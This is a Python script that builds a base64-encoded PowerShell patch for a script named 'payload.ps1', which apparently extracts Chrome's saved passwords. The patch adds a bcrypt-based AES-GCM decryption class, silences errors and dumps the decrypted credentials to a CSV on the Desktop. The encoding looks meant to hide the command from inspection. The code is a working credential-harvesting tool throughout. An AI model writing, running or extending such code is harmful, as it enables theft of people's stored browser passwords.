import base64

patch_code = """
$ErrorActionPreference = 'SilentlyContinue'
$c = Get-Content 'payload.ps1' -Raw
$c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
$c = $c -replace '\\$arrExp \\| Format-Table', ('$arrExp | Export-Csv -Path "' + $env:USERPROFILE + '\\Desktop\\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
$c = $c -replace '\\[System\\.Convert\\]::FromHexString\\([^)]*\\)', '0x00'

# Replace AesGcm with our fallback
$c = $c -replace '\\[AesGcm\\]', '[AesGcmFallback]'

# Fix namespace issues
$c = $c -replace 'using namespace "System\\.Security\\.Cryptography"', ''
$c = $c -replace '\\[ProtectedData\\]', '[System.Security.Crypto''graphy.ProtectedData]'

$c = $c -replace '#requires -version 7', ''

$csharpcode = @"
using System;
using System.Runtime.InteropServices;
public class AesGcmFallback {
    [DllImport("bcrypt.dll")]
    public static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);
    [DllImport("bcrypt.dll")]
    public static extern int BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, int dwFlags);
    [DllImport("bcrypt.dll")]
    public static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, int dwFlags);
    [DllImport("bcrypt.dll")]
    public static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);
    [StructLayout(LayoutKind.Sequential)]
    public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
        public int cbSize; public int dwInfoVersion; public IntPtr pbNonce; public int cbNonce; public IntPtr pbAuthData;
        public int cbAuthData; public IntPtr pbTag; public int cbTag; public IntPtr pbMacContext; public int cbMacContext;
        public int cbAAD; public long cbData; public int dwFlags;
    }
    private IntPtr hKey = IntPtr.Zero;
    private IntPtr hAlg = IntPtr.Zero;
    public AesGcmFallback(byte[] key) {
        BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
        byte[] chainMode = System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM\\0");
        BCryptSetProperty(hAlg, "ChainingMode", chainMode, chainMode.Length, 0);
        BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
    }
    public void Decrypt(byte[] nonce, byte[] ciphertext, byte[] tag, byte[] plaintext, byte[] aad) {
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
        authInfo.cbSize = Marshal.SizeOf(authInfo); authInfo.dwInfoVersion = 1;
        authInfo.pbNonce = Marshal.AllocHGlobal(nonce.Length); Marshal.Copy(nonce, 0, authInfo.pbNonce, nonce.Length); authInfo.cbNonce = nonce.Length;
        authInfo.pbTag = Marshal.AllocHGlobal(tag.Length); Marshal.Copy(tag, 0, authInfo.pbTag, tag.Length); authInfo.cbTag = tag.Length;
        int resultSize = 0;
        BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref authInfo, null, 0, plaintext, plaintext.Length, out resultSize, 0);
        Marshal.FreeHGlobal(authInfo.pbNonce); Marshal.FreeHGlobal(authInfo.pbTag);
    }
}
"@

$header = "Add-Type -AssemblyName System.Security`nAdd-Type -TypeDefinition @`"`n" + $csharpcode + "`n`"@`n"
$c = $c -replace '(?m)^\\$scriptVersion = "1\\.0\\.2"', ("`$scriptVersion = `"1.0.2`"`n" + $header)

Set-Content 'run_chrome.ps1' -Value $c
"""

b64_str = base64.b64encode(patch_code.encode('utf-16le')).decode('ascii')
print(b64_str)
